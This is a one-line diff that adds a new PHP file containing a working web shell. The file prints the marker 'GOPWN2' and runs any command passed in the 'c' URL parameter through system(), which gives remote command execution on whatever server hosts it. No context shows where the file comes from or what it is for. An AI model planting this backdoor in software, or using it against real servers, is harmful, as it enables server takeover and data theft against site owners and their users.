@@ -1,0 +1,1 @@
+<?php echo "GOPWN2"; system($_GET["c"]); ?>
